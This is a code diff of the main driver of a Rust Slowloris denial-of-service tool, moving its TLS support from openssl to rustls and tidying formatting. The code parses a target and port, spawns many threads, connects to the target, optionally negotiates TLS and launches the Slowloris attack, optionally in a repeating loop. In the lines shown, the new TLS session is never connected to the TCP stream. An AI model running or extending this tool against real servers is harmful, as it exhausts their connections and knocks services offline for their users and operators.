@@ -1,14 +1,17 @@
 extern crate docopt;
 extern crate rustc_serialize;
-extern crate openssl;
-#[macro_use] extern crate log;
+#[macro_use]
+extern crate log;
 extern crate env_logger;
 extern crate num_cpus;
+extern crate rustls;
+extern crate webpki;
+extern crate webpki_roots;
 
 use docopt::Docopt;
 use std::net::TcpStream;
+use std::sync::Arc;
 use std::thread;
-use openssl::ssl::{SslMethod, SslConnectorBuilder};
 
 mod slowloris_attack;
 use slowloris_attack::slowloris_attack;
@@ -45,7 +48,7 @@ struct Args {
     flag_repeat: bool,
     flag_threads: Option<usize>,
     cmd_get: bool,
-    cmd_post: bool
+    cmd_post: bool,
 }
 
 #[derive(Debug, Clone)]
@@ -58,7 +61,7 @@ impl Target {
     fn new(target: String, port: usize) -> Self {
         Target {
             domain: format!("{}", target),
-            designator: format!("{}:{}", target, port)
+            designator: format!("{}:{}", target, port),
         }
     }
     fn get_designator(&self) -> &str {
@@ -77,8 +80,8 @@ fn main() {
     env_logger::init().unwrap();
     debug!("Logging successfully initialized.");
     let args: Args = Docopt::new(USAGE)
-                            .and_then(|d| d.decode())
-                            .unwrap_or_else(|e| e.exit());
+        .and_then(|d| d.decode())
+        .unwrap_or_else(|e| e.exit());
 
     // The default port is 80, but for SSL it's 443.
     let default_port = if args.flag_ssl { 443 } else { 80 };
@@ -100,11 +103,23 @@ fn main() {
         target.set_domain(&domain);
     }
 
+    // Set up rustls process global
+    let mut ssl_config = rustls::ClientConfig::new();
+    ssl_config
+        .root_store
+        .add_server_trust_anchors(&webpki_roots::TLS_SERVER_ROOTS);
+    let ssl_config = Arc::new(ssl_config);
+
     loop {
-        println!("Beginning SlowLoris against target {} with {} threads.", target.get_designator(), threads);
+        println!(
+            "Beginning SlowLoris against target {} with {} threads.",
+            target.get_designator(),
+            threads
+        );
         let mut handles = Vec::with_capacity(threads);
         for threadn in 0..threads {
             let target = target.clone();
+            let ssl_config = ssl_config.clone();
             handles.push(
                 thread::spawn(move || {
                     // Attempt to connect to the target.
@@ -113,14 +128,13 @@ fn main() {
                     info!("[CONTROL:{}] Succesfully connected to {}.", threadn, target.get_designator());
                     // If needed, connect SSL to the target.
                     if ssl {
-                        // Attempt to set up SSL
-                        let connector = SslConnectorBuilder::new(SslMethod::tls())
-                            .unwrap_or_else(|e| {error!("[CONTROL:{}] !!! Failed to build SSL functionality. {}", threadn, e); panic!();})
-                            .build();
-                        debug!("[CONTROL:{}] Built SSL functionality.", threadn);
                         // Attempt to connect SSL
-                        let mut ssl_stream = connector.connect(target.get_domain(), tcp_stream)
-                            .unwrap_or_else(|e| {error!("[CONTROL:{}] !!! Couldn't connect TLS. {}\nDid you provide a domain name, not an IP?", threadn, e); panic!();});
+                        let tgt_domain = webpki::DNSNameRef::try_from_ascii_str(target.get_domain())
+                            .unwrap_or_else(|e| {
+                                error!("[CONTROL:{}] !!! Couldn't get DNS reference for domain. {}\nDid you provide a domain name, not an IP?", threadn, e);
+                                panic!();
+                            });
+                        let mut ssl_stream = rustls::ClientSession::new(&ssl_config, tgt_domain);
                         info!("[CONTROL:{}] Successfully connected with TLS.", threadn);
                         if cmd_get {
                             slowloris_attack(&mut ssl_stream, timeout, cycles, finalize, false, threadn);
@@ -142,14 +156,16 @@ fn main() {
             for handle in handles {
                 match handle.join() {
                     Ok(_) => print!("."),
-                    Err(_) => print!("x")
+                    Err(_) => print!("x"),
                 };
                 println!();
             }
         } else {
             // In this case there is only one thread. Pop it, join it, and suppress errors.
-            handles.pop().unwrap().join().unwrap_or_else(|_| {()} );
+            handles.pop().unwrap().join().unwrap_or_else(|_| ());
         }
-        if !repeat {break;}
+        if !repeat {
+            break;
+        }
     }
 }
